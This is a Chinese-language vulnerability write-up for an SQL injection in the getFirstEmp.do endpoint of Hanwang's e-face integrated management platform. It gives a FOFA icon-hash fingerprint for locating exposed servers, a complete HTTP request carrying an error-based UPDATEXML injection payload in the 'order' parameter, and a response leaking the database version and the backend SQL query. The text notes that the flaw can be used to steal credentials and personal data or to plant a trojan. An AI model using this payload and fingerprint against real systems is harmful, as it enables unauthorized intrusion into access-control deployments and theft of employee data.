## 汉王e脸通综合管理平台-getFirstEmp.do-SQL注入漏洞

## 一、漏洞简介
汉王e脸通综合管理平台 getFirstEmp.do 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
icon_hash="1380907357"
```

## POC
```
GET /manage/firstPeopleOpen/getFirstEmp.do?recoToken=67mds2pxQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

## POC
```
HTTP/1.1 200 OK
Server: nginx/1.21.0
Date: Tue, 06-Jan-2026 02:25:30 GMT
Content-Type: text/html; charset=utf-8 text/html;charset=UTF-8
Connection: keep-alive
Set-Cookie: JSESSIONID=872752FF5F99C7468971E97E982BC6B4; Path=/; HttpOnly
vary: accept-encoding
Content-Length: 1225

{
"success": false,
"resultCode": 0,
"msg": "\r\n### Error querying database. Cause: java.sql.SQLException: XPath syntax error: '~5.7.16~'\r\n### The error may exist in class path resource [com/hanvon/iface/mapper/mysql/access/AccessFirstOpenDoorDao.xml]\r\n### The error may involve defaultParameterMap\r\n### The error occurred while setting parameters\r\n### SQL: select count(0) from (select afoe.ID , ei.SZ_NAME name, ei.SZ_EMPLOYEE_ID attendanceCode, ed.NG_ID ID, ed.departmentId, ed.SZ_TELEPHONE phone, ed.SZ_NAME departmentName from ACCESS_FIRST_OPEN_EMPLOYEE afoe left join SYS_USER_USER ei on ei.NG_ID = afoe.EMPLOYEE_ID left join SYS_USER_BRANCH sub on sub.NG_USER_ID = ei.NG_ID left join SYS_USER_BRANCH ed on ed.NG_ID = sub.NG_BRANCH_ID where ei.NT_USER_STATE = ? and afoe.DOOR_ID = ?) ORDER BY (UPDATEXML(2920,CONCAT(0x7e,@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) limit 0, 1000\r\n### Cause: java.sql.SQLException: XPath syntax error: '~5.7.16~' ; nested exception is java.sql.SQLException: XPath syntax error: '~5.7.16~'"
}
```
